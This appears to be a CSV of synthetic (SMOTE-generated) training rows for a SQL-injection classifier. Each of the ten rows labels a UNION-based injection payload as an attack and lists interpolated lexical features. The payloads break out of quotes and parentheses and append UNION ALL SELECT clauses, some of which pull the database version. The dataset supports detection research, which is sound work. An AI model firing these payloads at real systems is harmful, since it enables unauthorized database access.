id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000001,attack,union,"1""   )    )    union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000282,0.8026275594493638,80.51593777297406,16.0,3.0668561031453088,51.625500436758486,1.0,15.187249781620755,12.70318755459481,0.6403912569011082,0.012430165066047827,0.1894411392574066,0.15773743877543742,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.2968124454051893,-1.3877787807814457e-17,0.0,8.406375109189621,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000002,attack,union,"-4285'   )    )     )   union all select 8819,8819,8819,8819,8819,8819,8819,8819#",nearest_attack_euclidean,R000211,1.02758519255647,81.31113092697393,22.311130926973938,3.5694269867471404,14.0,36.0,18.0,13.311130926973936,0.17218370476097034,0.4427580979567808,0.22137904897839042,0.16367914830385843,1.0,0.0,1.0,0.0,0.0,0.0,0.0,3.0,0.31113092697393624,0.0,7.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000003,attack,union,"1'+  (  select oqvo where 7448  =  7448 union all select null,null,null,null,null--",nearest_attack_euclidean,R000155,0.3441288911239807,82.51096894351797,25.87774223587949,4.011444383323676,48.510968943517966,9.0,15.122257764120508,9.877742235879492,0.5878256739483927,0.10910496866071959,0.18338918106896945,0.11968017632191827,1.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,-1.3877787807814457e-17,0.0,4.0,3.8777422358794915,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.8777422358794913,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8777422358794915
SMOTE_000004,attack,union,"1  )   as wokl where 1368  =  1368 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000234,0.4965885600383968,82.05681284258183,22.68560428086061,3.7755140594018624,48.37120856172122,9.0,15.37120856172122,9.314395719139391,0.5894618194783663,0.10971215126758486,0.18718393149722168,0.11364209775682724,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,-1.3877787807814457e-17,0.0,5.31439571913939,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000005,attack,union,"1""  )   union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000129,0.20033568543879315,76.06058613652101,16.060586136521003,3.0720383468653822,54.0,1.0,8.0,13.060586136521003,0.7099672502781725,0.01314754167181803,0.10518033337454408,0.17170487467546536,0.0,1.0,2.0,0.0,0.0,0.0,0.0,1.0,0.06058613652100385,0.0,9.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000006,attack,union,"-3130'   )    )     )   union all select 2886,2886,2886,2886,2886,2886,2886#",nearest_attack_euclidean,R000209,0.15539160208339303,76.0,21.67673080374292,3.680194158730444,14.0,32.0,18.0,12.0,0.18421052631578946,0.42105263157894735,0.23684210526315788,0.15789473684210525,1.0,0.0,1.0,0.0,0.0,0.0,0.0,3.0,-1.3877787807814457e-17,0.0,6.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000007,attack,union," select * from users where id  =  '1' + @ 1! union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000099,0.35507309201800946,82.36953125458099,28.0,3.951756379392439,40.0,3.7898437515269983,25.36953125458099,13.210156248473004,0.48572571533384945,0.04594561842747244,0.30784085564926456,0.1604878105894136,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,5.789843751526997,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000008,attack,union,"-2783' where 1494  =  1494 union all select 1494,1494,1494,1494,1494,1494--",nearest_attack_euclidean,R000199,1.1348323742018271,76.09690791338119,25.0,3.8933946225255327,19.0,37.09690791338119,10.0,10.0,0.24981582272502237,0.48722015335390145,0.1314820119605381,0.13148201196053808,1.0,0.0,2.451546043309407,0.0,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,5.274226978345297,3.451546043309407,1.0,0.0,0.7257730216547035,0.2742269783452965,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000009,attack,union," select * from users where id  =  '1' +   (  \  )   union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000089,0.6359830114480002,81.20146227728151,34.55036556932038,4.258375575182453,40.0,2.550365569320375,24.100731138640754,14.550365569320377,0.4928994218253378,0.03127588156500638,0.2966789884970482,0.1791457081126077,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,-1.3877787807814457e-17,0.0,1.0,4.550365569320376,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000010,attack,union,"1""   )    )    as isqj where 6344  =  6344 union all select null,null,null,null--",nearest_attack_euclidean,R000138,0.9932437394766225,79.42796603978763,24.371186415915055,3.8288631005223395,41.628813584084945,9.0,19.484745663660224,9.314406792042472,0.5249167142104593,0.11340940637457947,0.24412754156613875,0.11754633784882251,0.0,1.0,2.0,0.0,0.0,1.0,0.0,1.6855932079575282,-1.3877787807814457e-17,0.0,3.6288135840849436,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
